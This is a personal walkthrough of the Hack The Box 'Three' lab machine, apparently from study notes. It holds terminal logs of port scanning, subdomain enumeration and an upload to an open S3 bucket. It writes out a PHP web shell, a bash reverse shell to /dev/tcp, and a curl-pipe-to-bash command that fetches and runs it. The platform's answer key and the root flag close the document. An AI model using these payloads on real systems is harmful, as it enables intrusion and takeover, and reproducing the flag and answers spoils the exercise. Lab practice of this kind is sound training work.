```
blob:https://app.hackthebox.com/c7b3996d-5817-4fb7-94c9-84b46a4c9947

┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.129.105.231 --ulimit 5500 -b 65535 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.129.105.231:22
Open 10.129.105.231:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-04 12:43 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:43
Completed NSE at 12:43, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:43
Completed NSE at 12:43, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:43
Completed NSE at 12:43, 0.00s elapsed
Initiating Ping Scan at 12:43
Scanning 10.129.105.231 [2 ports]
Completed Ping Scan at 12:43, 0.19s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:43
Completed Parallel DNS resolution of 1 host. at 12:43, 0.02s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:43
Scanning 10.129.105.231 [2 ports]
Discovered open port 22/tcp on 10.129.105.231
Discovered open port 80/tcp on 10.129.105.231
Completed Connect Scan at 12:43, 0.19s elapsed (2 total ports)
Initiating Service scan at 12:43
Scanning 2 services on 10.129.105.231
Completed Service scan at 12:43, 6.73s elapsed (2 services on 1 host)
NSE: Script scanning 10.129.105.231.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:43
Completed NSE at 12:43, 8.83s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:43
Completed NSE at 12:43, 1.32s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:43
Completed NSE at 12:43, 0.00s elapsed
Nmap scan report for 10.129.105.231
Host is up, received syn-ack (0.19s latency).
Scanned at 2022-11-04 12:43:32 EDT for 17s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 178bd425452a20b879f8e258d78e79f4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCitBp4qe2+WEqMGa7+L3eEgbrqD/tH3G5PYsQ9nMFx6Erg9Rp+jn7D9QqC9GqKdraCCUQTzVoW3zqEd83Ef4iWR7VXjTb469txJU+Y8XlG/4JzegbjO6WYyfQTtQ3nLkqpa21BZEdH9ap28mcJAggj4/uHTiA3yTgZ2C+zPA6LoIS7CaB1DPK2q/8wrxDiRNv4gGiSjcxEilpL8Qls4R3Ny3QJD89hvgEdV9zapTS5T9hOfUdwbkElabjrWL4zs/E+cyHSZF5pPREiv6QkdMmk7cvMND5epXA29womDuabJsDLhrFYFecJxDmXhv6yspRAemCewOX+GnWckerKYeOf
|   256 e60f1af6328a40ef2da73b22d1c714fa (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEkEPksFeIH9z6Ds6r7s2Uff45kDk/PEnvXYwP0ny6pKsP2s62W3PZVCywfF3aC8ONsAqQh6zy0s44Zv8B8g+rI=
|   256 2de1874175f391544116b72b80c68f05 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINwGMkF/JG8KPrh19vLPmhe+RC0WBQt06gh1zE3EOo2q
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: The Toppers
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:43
Completed NSE at 12:43, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:43
Completed NSE at 12:43, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:43
Completed NSE at 12:43, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.78 seconds


┌──(kali㉿kali)-[~]
└─$ sudo nano /etc/hosts  
[sudo] password for kali: 
                                                                                                                  
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts         
127.0.0.1       localhost
127.0.1.1       kali
10.10.113.254   magician
10.10.121.237   git.git-and-crumpets.thm
10.10.149.10    hipflasks.thm hipper.hipflasks.thm
10.10.91.93     raz0rblack raz0rblack.thm
10.10.234.77    lab.enterprise.thm
10.10.96.58     source
10.10.59.104    CONTROLLER.local
10.10.54.75     acmeitsupport.thm
10.10.102.33    overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic.uploadvulns.thm jewel.uploadvulns.thm demo.uploadvulns.thm
10.10.179.221   development.smag.thm
10.10.87.241    mafialive.thm
10.10.97.105    internal.thm
10.10.106.113   retro.thm
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters


10.10.148.19 webenum.thm
10.10.148.19 mysubdomain.webenum.thm
10.10.148.19 learning.webenum.thm
10.10.148.19 products.webenum.thm
10.10.148.19 Products.webenum.thm
10.10.67.130 wpscan.thm
10.10.142.247 blog.thm
10.10.138.76 erit.thm
10.10.153.100 docker-rodeo.thm
10.129.132.154 unika.htb
10.129.105.231 thetoppers.htb


contact


Chicago, US
Phone: +01 343 123 6102
Email: mail@thetoppers.htb

Subdomains like ...thetoppers.htb

┌──(kali㉿kali)-[~]
└─$ gobuster vhost -u http://thetoppers.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -t 64
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://thetoppers.htb
[+] Method:          GET
[+] Threads:         64
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.3
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
2022/11/04 13:20:54 Starting gobuster in VHOST enumeration mode
===============================================================
Found: s3.thetoppers.htb Status: 404 [Size: 21]
Found: gc._msdcs.thetoppers.htb Status: 400 [Size: 306]

┌──(kali㉿kali)-[~]
└─$ echo "10.129.105.231 s3.thetoppers.htb" | sudo tee -a /etc/hosts
10.129.105.231 s3.thetoppers.htb
                                                                                                                  
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.10.113.254   magician
10.10.121.237   git.git-and-crumpets.thm
10.10.149.10    hipflasks.thm hipper.hipflasks.thm
10.10.91.93     raz0rblack raz0rblack.thm
10.10.234.77    lab.enterprise.thm
10.10.96.58     source
10.10.59.104    CONTROLLER.local
10.10.54.75     acmeitsupport.thm
10.10.102.33    overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic.uploadvulns.thm jewel.uploadvulns.thm demo.uploadvulns.thm
10.10.179.221   development.smag.thm
10.10.87.241    mafialive.thm
10.10.97.105    internal.thm
10.10.106.113   retro.thm
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters


10.10.148.19 webenum.thm
10.10.148.19 mysubdomain.webenum.thm
10.10.148.19 learning.webenum.thm
10.10.148.19 products.webenum.thm
10.10.148.19 Products.webenum.thm
10.10.67.130 wpscan.thm
10.10.142.247 blog.thm
10.10.138.76 erit.thm
10.10.153.100 docker-rodeo.thm
10.129.132.154 unika.htb
10.129.105.231 thetoppers.htb
10.129.105.231 s3.thetoppers.htb

visit: http://s3.thetoppers.htb/
{"status": "running"}

https://docs.aws.amazon.com/AmazonS3/latest/userguide/Welcome.html

┌──(kali㉿kali)-[~]
└─$ sudo apt install awscli                    
[sudo] password for kali: 
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following additional packages will be installed:
  groff psutils python3-botocore python3-jmespath python3-rsa python3-s3transfer
The following NEW packages will be installed:
  awscli groff psutils python3-botocore python3-jmespath python3-rsa python3-s3transfer
0 upgraded, 7 newly installed, 0 to remove and 0 not upgraded.
Need to get 10.2 MB of archives.
After this operation, 89.6 MB of additional disk space will be used.
Do you want to continue? [Y/n] Y
Get:1 http://kali.download/kali kali-rolling/main amd64 groff amd64 1.22.4-8 [3,983 kB]
Get:2 http://kali.download/kali kali-rolling/main amd64 python3-jmespath all 1.0.1-1 [21.1 kB]
Get:3 http://http.kali.org/kali kali-rolling/main amd64 python3-botocore all 1.26.8+repack-1 [4,865 kB]
Get:4 http://kali.download/kali kali-rolling/main amd64 python3-rsa all 4.8-1 [31.1 kB]
Get:5 http://kali.download/kali kali-rolling/main amd64 python3-s3transfer all 0.6.0-1 [53.0 kB]
Get:6 http://kali.download/kali kali-rolling/main amd64 awscli all 1.24.8-1 [1,175 kB]
Get:7 http://kali.download/kali kali-rolling/main amd64 psutils amd64 1.17.dfsg-4 [59.1 kB]
Fetched 10.2 MB in 3s (2,938 kB/s)
Selecting previously unselected package groff.
(Reading database ... 416365 files and directories currently installed.)
Preparing to unpack .../0-groff_1.22.4-8_amd64.deb ...
Unpacking groff (1.22.4-8) ...
Selecting previously unselected package python3-jmespath.
Preparing to unpack .../1-python3-jmespath_1.0.1-1_all.deb ...
Unpacking python3-jmespath (1.0.1-1) ...
Selecting previously unselected package python3-botocore.
Preparing to unpack .../2-python3-botocore_1.26.8+repack-1_all.deb ...
Unpacking python3-botocore (1.26.8+repack-1) ...
Selecting previously unselected package python3-rsa.
Preparing to unpack .../3-python3-rsa_4.8-1_all.deb ...
Unpacking python3-rsa (4.8-1) ...
Selecting previously unselected package python3-s3transfer.
Preparing to unpack .../4-python3-s3transfer_0.6.0-1_all.deb ...
Unpacking python3-s3transfer (0.6.0-1) ...
Selecting previously unselected package awscli.
Preparing to unpack .../5-awscli_1.24.8-1_all.deb ...
Unpacking awscli (1.24.8-1) ...
Selecting previously unselected package psutils.
Preparing to unpack .../6-psutils_1.17.dfsg-4_amd64.deb ...
Unpacking psutils (1.17.dfsg-4) ...
Setting up groff (1.22.4-8) ...
Setting up python3-jmespath (1.0.1-1) ...
Setting up python3-botocore (1.26.8+repack-1) ...
Setting up python3-rsa (4.8-1) ...
Setting up psutils (1.17.dfsg-4) ...
Setting up python3-s3transfer (0.6.0-1) ...
Setting up awscli (1.24.8-1) ...
Processing triggers for kali-menu (2022.4.1) ...
Processing triggers for man-db (2.11.0-1+b1) ...
Scanning processes...                                                                                             
Scanning processor microcode...                                                                                   
Scanning linux images...    

┌──(kali㉿kali)-[~]
└─$ aws configure                   
AWS Access Key ID [None]: temp
AWS Secret Access Key [None]: temp
Default region name [None]: temp
Default output format [None]: temp


We can list all of the S3 buckets hosted by the server by using the ls command.

┌──(kali㉿kali)-[~]
└─$ aws --endpoint=http://s3.thetoppers.htb s3 ls
2022-11-04 13:03:37 thetoppers.htb

We can also use the ls command to list objects and common prefixes under the specified bucket

┌──(kali㉿kali)-[~]
└─$ aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
                           PRE images/
2022-11-04 13:03:37          0 .htaccess
2022-11-04 13:03:37      11952 index.php

We can use the following PHP one-liner which uses the system() function which takes the URL parameter
cmd as an input and executes it as a system command

┌──(kali㉿kali)-[~]
└─$ echo '<?php system($_GET["cmd"]); ?>' > shell.php      
                                                                                                                  
┌──(kali㉿kali)-[~]
└─$ cat shell.php 
<?php system($_GET["cmd"]); ?>

┌──(kali㉿kali)-[~]
└─$ aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php  s3://thetoppers.htb
upload: ./shell.php to s3://thetoppers.htb/shell.php 

http://thetoppers.htb/shell.php?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data) 

http://thetoppers.htb/shell.php?cmd=hostname
three 

http://thetoppers.htb/shell.php?cmd=ls

images index.php shell.php 



rev shell

┌──(kali㉿kali)-[~]
└─$ mousepad shell.sh                                                        
                                                                                                                  
┌──(kali㉿kali)-[~]
└─$ cat shell.sh 
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.51/1337 0>&1

┌──(kali㉿kali)-[~]
└─$ rlwrap nc -nlvp 1337                                   
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337

┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

http://thetoppers.htb/shell.php?cmd=curl%2010.10.14.51:8000/shell.sh|bash

┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.105.231 - - [04/Nov/2022 13:43:55] "GET /shell.sh HTTP/1.1" 200 -

┌──(kali㉿kali)-[~]
└─$ rlwrap nc -nlvp 1337                                   
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.129.105.231.
Ncat: Connection from 10.129.105.231:33626.
bash: cannot set terminal process group (1542): Inappropriate ioctl for device
bash: no job control in this shell
www-data@three:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@three:/var/www/html$ hotname
hotname

Command 'hotname' not found, did you mean:

  command 'hostname' from deb hostname

Try: apt install <deb name>

www-data@three:/var/www/html$ hostname
hostname
three
www-data@three:/var/www/html$ find / -type f -name flag.txt 2>/dev/null
find / -type f -name flag.txt 2>/dev/null
/var/www/flag.txt

www-data@three:/var/www/html$ cat /var/www/flag.txt
cat /var/www/flag.txt
a980d99281a28d638ac68b9bf9453c2b

pwnd

http://thetoppers.htb/shell.php?cmd=find%20/%20-type%20f%20-name%20flag.txt%202%3E/dev/null
/var/www/flag.txt 

http://thetoppers.htb/shell.php?cmd=cat%20/var/www/flag.txt
a980d99281a28d638ac68b9bf9453c2b 



```



How many TCP ports are open? 
*2*

What is the domain of the email address provided in the "Contact" section of the website? 
*thetoppers.htb*

In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames? 

*/etc/hosts*

 Which sub-domain is discovered during further enumeration? 
Use an enumeration tool like `wfuzz`, `ffuf` etc.

*s3.thetoppers.htb*

Which service is running on the discovered sub-domain? 
A Google search with the keywords "s3 subdomain status running" should help.
*Amazon S3*

Which command line utility can be used to interact with the service running on the discovered sub-domain? 

*awscli*

Which command is used to set up the AWS CLI installation? 
Refer to the [official AWS CLI documentation](https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-quickstart.html).
*aws configure*

What is the command used by the above utility to list all of the S3 buckets? 
https://docs.aws.amazon.com/cli/latest/reference/s3/ls.html
*aws s3 ls *

This server is configured to run files written in what web scripting language? 
One of the most common web scripting language.
*php*

Submit root flag 
*a980d99281a28d638ac68b9bf9453c2b*



[[Responder]]